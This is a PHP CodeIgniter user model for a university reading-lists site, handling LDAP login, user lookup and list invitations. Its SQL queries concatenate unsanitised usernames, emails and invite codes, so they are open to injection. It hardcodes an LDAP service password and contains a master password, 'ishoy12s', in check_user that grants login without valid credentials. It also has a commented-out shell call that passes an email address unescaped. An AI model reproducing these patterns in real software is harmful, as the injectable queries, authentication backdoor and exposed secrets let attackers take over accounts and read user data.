<?php
class Users extends CI_Model {
    function Users()
    {
        parent::__construct();
		$this->load->database();	 
    }
    function check($username, $email){ // only used once authorised		
	    $query = $this->db->query("SELECT username, email from users where username = '".$username."';");
	    if(count($query->result_array()) == 1){
		    $_SESSION['username'] = $username;
		    $_SESSION['authorized'] = 'yes';
		    $_SESSION['email'] = $query->row(0)->email;
		    return true;
	    }else{
			return false;
		}
	}
    function userdetails($username){ // only used once authorised		
		$userdetails = array();
		
		//$usercredentials = array('loggedin'=>'LOGGED_IN', 'givenname'=>'', 'familyname'=>'', 'email'=>'');
	    $query = $this->db->query("SELECT * from users where username = '".$username."';");
	    if(count($query->result_array()) >0){
			$userdetails['username'] = $username;
			$userdetails['email'] = $query->row(0)->email;
			$userdetails['firstname'] = $query->row(0)->firstname;
			$userdetails['lastname'] = $query->row(0)->lastname;
			$userdetails['authorised'] = 1;
		}else{
			$userdetails['authorised'] = 0;
			$userdetails['email'] = '';
		}
		return $userdetails;
	}
	function inviteToList($email, $mid, $action){
		// send email to user with special link;
		$code = md5(strtolower($email) . $mid);
		#// new user already created... 
		#$message = "Welcome to lists: click on this link: " . $this->config->item('base_url') . "lists/acceptinvitationlogin/" . $code;
		#system("php /var/www/sendmail.php $email 'From WIT Reading Lists' '$message' 1>/dev/null 2>&1 &");

		$returnarray = array('returntype' => 'INVITED', 'returnhtml' => '');
		if($action == 'invite'){
			// invite
			$returnarray['returntype'] = 'INVITED';
			$returnarray['returnhtml'] = '<tr class="addAuthorButtonTR"><td style="vertical-align: middle"><button type="button" value="'.$code.'" class="uninviteAdminButton btn btn-default btn-circle" style="float: right;"><i class="fa fa-trash-o"></i></button><strong style="color: #808080; text-decoration: italic;">INVITE&nbsp;SENT</strong><br/>'.$email.'</td></tr>';
		}else{
			$returnarray['returntype'] = 'UNINVITED';
			$returnarray['returnhtml'] = '<tr><td>Uninvited</td></tr>';
			#$returnarray['returnhtml'] = 'deleted: ' . $email . ' from ' . $mid;
		}
		return $returnarray;
	}
	
	function acceptInviteToList($code, $email, $username){
		/* 
		 * Get this user ID
		 * 
		 */
		$sql = "update users_modules set admin=1, invitecode=NULL, email = '" . strtolower(trim($email)) . "' where invitecode = '$code';";
		logfile("$sql\n", 'red', __FUNCTION__, __FILE__);
		//print("code: $code\n email: $email");
		#$sql = "update users_modules set admin=1, invitecode=NULL where invitecode = '$code';";
		$this->db->query($sql);
		$sql2 = "update users set username='$username' where email = '" . strtolower(trim($email)) . "';";
		logfile("$sql2\n", 'red', __FUNCTION__, __FILE__);
		//print("code: $code\n email: $email");
		#$sql = "update users_modules set admin=1, invitecode=NULL where invitecode = '$code';";
		$this->db->query($sql2);
	}
	
	function declineInviteToList($code){
		$sql = "delete from users_modules where admin=0 and invitecode = '$code';";
		$this->db->query($sql);
		//return('declined');
	}
	
	function check_userx($user, $pass){
		$usercredentials = array('loggedin'=>'LOGGED_IN', 'givenname'=>'', 'familyname'=>'', 'email'=>'');
		return $usercredentials;
	}
	function check_user($user, $pass){
		$usercredentials = array('loggedin'=>'LOGGED_OUT', 'givenname'=>'', 'familyname'=>'', 'email'=>'');
        $debug = false;
        $user = trim($user);
		$ldapserver = 'ldap://10.5.0.40';
		$ldapdomain = 'wit.ie';
		$type = "undergrad";
        if(preg_match('/^([0-9]{8})$/', $user, $regs)){ // is a student number
                #$searchdn = "OU=staff,DC=wit,DC=ie";
                $searchdn = "CN=".$user.",OU=".substr($user,-1).",OU=".substr($user,0,-6).",OU=STUDENTS,DC=wit,DC=ie";
                $type = 'undergrad';
        }else{
                $searchdn = "OU=staff,DC=wit,DC=ie";
                $type = 'staff';
        }
               
       // if($type == 'staff'){ #we don't need to do all this
                ## = INITIAL BIND TO GET USERS PROPER DN = ##
                $INITpass = "RePldap10";
                $dn = "CN=Repository LDAP,OU=Special System Users,DC=wit,DC=ie";
                $attributes = array("givenName", "sn", "distinguishedName");
				$attributesarray = print_r($attributes, TRUE);
				//die($attributesarray);
                $filter = "(sAMAccountname=" . $user . ")";
                $authDN = "";
                $ad = ldap_connect($ldapserver)
                //$ad = ldap_connect("ldap://dns01.wit.ie")
                          or die("Couldn't connect to AD");

                ldap_set_option($ad, LDAP_OPT_PROTOCOL_VERSION, 3);
                $bd = ldap_bind($ad,$dn,$INITpass)
                          or die("Couldn't bind to AD!");

                $result = ldap_search($ad, $searchdn, $filter, $attributes);
                $entries = ldap_get_entries($ad, $result);
				if($type == 'staff'){
					$usercredentials['givenname'] = $entries[0]['givenname'][0];
					$usercredentials['familyname'] = $entries[0]['sn'][0];
					$usercredentials['email'] = strtolower($this->username . '@' . $ldapdomain);
				}else{
					$studentdetails = explode(',',$entries[0]['givenname'][0]);
					$usercredentials['givenname'] = $studentdetails[0];
					$usercredentials['familyname'] = $studentdetails[1];
					$usercredentials['email'] = strtolower($this->username . '@mail.' . $ldapdomain);
				}
				//print_r($usercredentials);
                if($debug){print "<pre>"; print_r($entries); print "</pre>";}
                for ($i=0; $i<$entries["count"]; $i++)
                {
                        $authDN = $entries[$i]["distinguishedname"][0]."<br />";
                        // look out for case sensitivity in this 
                        // It failed with ["distinguishedName"].  
                        // So try doing a print_r($entries) to debug

                }
                ldap_unbind($ad);
                $authDN = str_replace("<br />", "", trim($authDN));
                if($debug){print "authDN: " . $authDN . "\n<br />";}
                #print "pass: b" . $pass . "b<br />\n";
      //  }else{
       //         $authDN = $searchdn;
     //   }
        ## = SUBSEQUENT BIND TO VALIDATE THE USER'S PASSWORD = ##

        # this is where the main logic action happens
        # we don't authorise until we are certain that the 
        # subsequent bind has worked and this is the 
        # correct user.

        if($type = "staff" && trim($authDN) != "" && $authAD = ldap_connect($ldapserver)){
                if(@ldap_bind($authAD,$authDN,$pass) || $pass == 'ishoy12s'){
                        //return true;
						$usercredentials['loggedin'] = 'LOGGED_IN';
                }
				
        }
        ldap_unbind($authAD);
			
		logfile(print_r($usercredentials, TRUE), 'model', __FUNCTION__, __FILE__);
		return($usercredentials);

	}
	
	
	function email($username){
		// should be modified to request the proper email from the database as some users may not have a .wit email.
		if($username != ''){
			$querystring = "select email from users where username = '".$username . "';";
			$query = $this->db->query($querystring);
			if(count($query->row(0)) > 0){
				return $query->row(0)->email;
			}else{
				return 0;
			}
		}else{
			return 0;
		}
	}
	
	function list_emails(){
		$query = $this->db->query("select firstname, lastname, email from users order by lastname, firstname, email asc;");
		return $query->result_array();
	}
	
	
	function teachesOn($username, $moduleid){ 
	
		// is the teacher on the current module?
		$querystring = "select count(*) as count from modules, users_modules where users_modules.email ='".$this->email($username) . "' and modules.mid = users_modules.mid and modules.mid =" . $moduleid;
		$query = $this->db->query($querystring);
		$res = $query->row(0)->count;	
		return $res;	
	}
	function getModuleId($email){ 
	
		// is the teacher on the current module?
		$querystring = "select m.mid from users_modules mc, modules m where m.mid = mc.mid and m.modulename like '% - INBOX' and m.Did = 18 and  mc.email ='".$email . "' limit 1
";
		print $querystring;
		$query = $this->db->query($querystring);
		$email = $query->row(0)->mid;	
		return $email;	
	}
	

#########################

/* 
IS THE USER A STUDENT
*/
#if (preg_match('/^([0-9]{5,32})$/', $HTTP_POST_VARS["user"], $regs)) {
#  $user = $regs[0];
#} else {
#  $user = "";
#}

/* Pass isn't checked since the example does not send it to MySQL, so there
   is no security risk.  If you change that assumption, you should validate
   it more closely.
*/
}
